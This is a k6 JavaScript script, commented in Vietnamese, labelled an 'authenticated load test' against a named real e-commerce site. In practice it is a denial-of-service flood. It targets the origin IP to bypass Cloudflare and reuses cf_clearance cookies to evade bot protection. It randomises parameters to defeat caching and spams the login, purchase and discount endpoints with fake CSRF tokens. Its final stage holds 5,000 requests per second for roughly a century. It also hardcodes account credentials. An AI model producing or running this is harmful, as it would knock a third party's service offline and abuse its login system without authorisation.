import http from 'k6/http';
import { check, sleep } from 'k6';
import { Counter, Rate, Trend } from 'k6/metrics';
import { randomIntBetween, randomItem } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

/* ==================================================================
   K6 AUTHENTICATED LOAD TEST - thanhhuyreal.com
   - Dùng PHPSESSID đã login sẵn
   - Hit thẳng IP gốc (bypass Cloudflare)
   - Random params để bypass cache, ép server query DB mỗi request
   - Multi-endpoint: search, listing, detail, API...
   ================================================================== */

const IP_URL  = (__ENV.IP_URL   || 'https://thanhhuyreal.com').replace(/\/+$/, '');
const HOST    = __ENV.SITE_HOST || 'thanhhuyreal.com';

// PHPSESSID: dung env var neu co, neu khong setup() se tu dong login
const PHPSESSID_ENV = __ENV.PHPSESSID || '';

const IDENTIFIER = __ENV.PHP_IDENTIFIER || 'lonussystem';
const PASSWORD   = __ENV.PHP_PASSWORD   || 'lonussystem123@';

// Cloudflare bypass (auto-refresh)
const CF_CLEARANCE_FILE = __ENV.CF_CLEARANCE_FILE || '';
const CF_UA_FILE = __ENV.CF_UA_FILE || '';

let CF_CLEARANCE = __ENV.CF_CLEARANCE || '';
let CF_UA = __ENV.CF_UA || 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36';

// Read from file if available (for auto-refresh)
if (CF_CLEARANCE_FILE && !CF_CLEARANCE) {
  try {
    const fs = require('fs');
    CF_CLEARANCE = fs.readFileSync(CF_CLEARANCE_FILE, 'utf8').trim();
    if (CF_UA_FILE) {
      CF_UA = fs.readFileSync(CF_UA_FILE, 'utf8').trim();
    }
    console.log(`Loaded cf_clearance from ${CF_CLEARANCE_FILE}: ${CF_CLEARANCE.substring(0, 50)}...`);
  } catch (e) {
    console.warn(`Cannot read ${CF_CLEARANCE_FILE}: ${e.message}`);
  }
}

// ===== Config =====
const STAGES_RAW  = __ENV.STAGES      || '30s:500,60s:2000,60s:5000,876000h:5000';
const START_RATE  = parseInt(__ENV.START_RATE  || '100',  10);
const PRE_VUS     = parseInt(__ENV.PRE_VUS     || '500',  10);
const MAX_VUS     = parseInt(__ENV.MAX_VUS     || '8000', 10);
const TIMEOUT     = __ENV.REQUEST_TIMEOUT      || '30s';
const MAX_ERR     = parseFloat(__ENV.MAX_ERR_RATE || '0.9');

// ===== Parse STAGES =====
const STAGES = STAGES_RAW.split(',').map(p => {
  const [d, t] = p.trim().split(':');
  return { duration: d.trim(), target: parseInt(t, 10) };
});

// ===== Headers chung (dung session tu setup) =====
function makeHeaders(session) {
  // Re-read cookie & UA from file if auto-refresh is enabled
  if (CF_CLEARANCE_FILE) {
    try {
      const fs = require('fs');
      const newCookie = fs.readFileSync(CF_CLEARANCE_FILE, 'utf8').trim();
      if (newCookie && newCookie !== CF_CLEARANCE) {
        CF_CLEARANCE = newCookie;
        if (CF_UA_FILE) {
          CF_UA = fs.readFileSync(CF_UA_FILE, 'utf8').trim();
        }
        console.log(`Cookie refreshed: ${CF_CLEARANCE.substring(0, 30)}...`);
      }
    } catch (e) {
      // Ignore read errors
    }
  }
  
  const ua = CF_CLEARANCE ? CF_UA : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
  
  let cookie = `PHPSESSID=${session}`;
  if (CF_CLEARANCE) {
    cookie += `; cf_clearance=${CF_CLEARANCE}`;
  }
  
  const headers = {
    'Cookie':           cookie,
    'User-Agent':       ua,
    'Accept':           'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language':  'vi-VN,vi;q=0.9,en;q=0.8',
    'Accept-Encoding':  'gzip, deflate, br',
    'Connection':       'keep-alive',
    'Cache-Control':    'no-cache',
    'Pragma':           'no-cache',
  };
  
  return headers;
}

function makeApiHeaders(session) {
  return Object.assign({}, makeHeaders(session), {
    'Accept':           'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type':     'application/x-www-form-urlencoded; charset=UTF-8',
  });
}

// ===== Endpoints thực tế từ thanhhuyreal.com =====
// Chỉ có POST APIs vì là server-side render PHP

const HEAVY_APIS = [
  // 1. Purchase API - Mua account (DB intensive: check stock, create transaction)
  () => ({
    url: `${IP_URL}/model/account/purchase`,
    body: `csrf_token=${getCsrfToken()}&account_id=${randomIntBetween(1,1000000)}&category_id=${randomIntBetween(1,500)}&price=${randomIntBetween(1,50)*1000}&total_price=${randomIntBetween(1,50)*1000}&membership_percentage=0`,
  }),
  
  // 2. Apply discount code (DB query: check code valid, calculate discount)
  () => ({
    url: `${IP_URL}/model/discount/apply`,
    body: `csrf_token=${getCsrfToken()}&code=${randomItem(['xc','sale','vip','promo','discount'])}&category_id=${randomIntBetween(1,500)}&quantity=${randomIntBetween(1,5)}`,
  }),
  
  // 3. Login API spam (bcrypt verify, session create)
  () => ({
    url: `${IP_URL}/model/login`,
    body: `csrf_token=${getCsrfToken()}&identifier=${IDENTIFIER}&password=${PASSWORD}`,
  }),
];

// GET pages (ít hơn vì SSR PHP)
const HEAVY_PAGES = [
  // Homepage với random params để bypass cache
  () => `${IP_URL}/?_=${Date.now()}&r=${randomIntBetween(1, 99999)}`,
  
  // Category pages (nếu có)
  () => `${IP_URL}/mua-acc?_=${Date.now()}`,
  () => `${IP_URL}/mua-acc/full-ruong-380-ve?_=${Date.now()}`,
  () => `${IP_URL}/mua-acc/random-skin-3s-sale?_=${Date.now()}`,
];

// Helper: Generate random CSRF token (giả lập - sẽ fail nhưng vẫn tạo load)
function getCsrfToken() {
  const chars = '0123456789abcdef';
  let token = '';
  for (let i = 0; i < 64; i++) {
    token += chars[Math.floor(Math.random() * chars.length)];
  }
  return token;
}

// ===== Metrics =====
const req2xx   = new Counter('req_2xx');
const req4xx   = new Counter('req_4xx');
const req5xx   = new Counter('req_5xx');
const reqErr   = new Counter('req_error');
const errRate  = new Rate('error_rate');
const reqDur   = new Trend('req_duration');

// ===== Auto-login: chay 1 lan truoc khi flood =====
export function setup() {
  // Neu co PHPSESSID san thi dung luon
  if (PHPSESSID_ENV) {
    console.log('Dung PHPSESSID tu env: ' + PHPSESSID_ENV.substring(0, 8) + '...');
    return { session: PHPSESSID_ENV };
  }

  console.log('Auto-login: GET csrf token...');

  // Buoc 1: GET trang login - phai co responseType:'text' de body khong bi discard
  const ua = CF_CLEARANCE ? CF_UA : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36';
  
  const loginHeaders = {
    'User-Agent': ua,
    'Accept':     'text/html,application/xhtml+xml',
  };
  
  if (CF_CLEARANCE) {
    loginHeaders['Cookie'] = `cf_clearance=${CF_CLEARANCE}`;
  }
  
  const loginPageRes = http.get(`${IP_URL}/?auth=login`, {
    headers: loginHeaders,
    responseType: 'text',  // override discardResponseBodies
    timeout: '30s',
  });

  if (loginPageRes.status !== 200) {
    console.error('GET login page that bai: status=' + loginPageRes.status);
    return { session: '' };
  }

  // Lay csrf_token tu HTML
  const csrfMatch = loginPageRes.body.match(/name="csrf_token"\s+value="([^"]+)"/);
  if (!csrfMatch) {
    console.error('Khong tim thay csrf_token trong HTML');
    return { session: '' };
  }
  const csrfToken = csrfMatch[1];
  console.log('CSRF: ' + csrfToken.substring(0, 10) + '...');

  // Lay PHPSESSID tu cookies cua response
  const cookiesObj = loginPageRes.cookies;
  const phpSessId = (cookiesObj['PHPSESSID'] && cookiesObj['PHPSESSID'][0])
    ? cookiesObj['PHPSESSID'][0].value
    : '';
  console.log('PHPSESSID: ' + (phpSessId ? phpSessId.substring(0, 8) + '...' : 'KHONG CO'));

  // Buoc 2: POST login
  const loginBody = [
    `csrf_token=${encodeURIComponent(csrfToken)}`,
    `identifier=${encodeURIComponent(IDENTIFIER)}`,
    `password=${encodeURIComponent(PASSWORD)}`,
  ].join('&');

  let loginCookie = `PHPSESSID=${phpSessId}`;
  if (CF_CLEARANCE) {
    loginCookie += `; cf_clearance=${CF_CLEARANCE}`;
  }
  
  const loginRes = http.post(`${IP_URL}/model/login`, loginBody, {
    headers: {
      'Cookie':            loginCookie,
      'Content-Type':      'application/x-www-form-urlencoded; charset=UTF-8',
      'Accept':            'application/json',
      'X-Requested-With':  'XMLHttpRequest',
      'User-Agent':        ua,
      'Referer':           `${IP_URL}/?auth=login`,
    },
    responseType: 'text',  // override discardResponseBodies
    timeout: '30s',
  });

  console.log('Login response status: ' + loginRes.status);

  let json = null;
  try { json = loginRes.json(); } catch(e) {}

  if (json && json.status === true) {
    console.log('Login THANH CONG! Session: ' + phpSessId.substring(0, 8) + '...');
    return { session: phpSessId };
  } else {
    const msg = json ? JSON.stringify(json) : (loginRes.body || '').substring(0, 100);
    console.warn('Login that bai: ' + msg);
    return { session: phpSessId }; // Dung session du chua xac nhan duoc
  }
}

export const options = {
  discardResponseBodies: true,
  scenarios: {
    // Scenario 1: Flood POST APIs (70% traffic - API nặng nhất)
    heavy_apis: {
      executor:        'ramping-arrival-rate',
      startRate:       Math.floor(START_RATE * 0.7),
      timeUnit:        '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.7),
      maxVUs:          Math.floor(MAX_VUS * 0.7),
      stages:          STAGES,
      exec:            'hitApi',
    },
    
    // Scenario 2: Flood GET pages (30% traffic - nhẹ hơn)
    heavy_pages: {
      executor:        'ramping-arrival-rate',
      startRate:       Math.floor(START_RATE * 0.3),
      timeUnit:        '1s',
      preAllocatedVUs: Math.floor(PRE_VUS * 0.3),
      maxVUs:          Math.floor(MAX_VUS * 0.3),
      stages:          STAGES,
      exec:            'hitPage',
    },
  },
  thresholds: {
    error_rate: [`rate<${MAX_ERR}`],
  },
};

// ===== Hit trang HTML nặng =====
export function hitPage(data) {
  const HEADERS = makeHeaders(data.session);
  const fn  = HEAVY_PAGES[randomIntBetween(0, HEAVY_PAGES.length - 1)];
  const url = fn();
  const res = http.get(url, { headers: HEADERS, timeout: TIMEOUT, tags: { name: 'page' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'khong 5xx': r => r.status < 500 });
}

// ===== Hit API POST nặng =====
export function hitApi(data) {
  const API_HEADERS = makeApiHeaders(data.session);
  const fn  = HEAVY_APIS[randomIntBetween(0, HEAVY_APIS.length - 1)];
  const { url, body } = fn();
  const res = http.post(url, body, { headers: API_HEADERS, timeout: TIMEOUT, tags: { name: 'api' } });

  const s = res.status;
  reqDur.add(res.timings.duration);
  errRate.add(s === 0 || s >= 500);

  if (s >= 200 && s < 400) req2xx.add(1);
  else if (s >= 400 && s < 500) req4xx.add(1);
  else if (s >= 500) req5xx.add(1);
  else reqErr.add(1);

  check(res, { 'api khong 5xx': r => r.status < 500 });
}
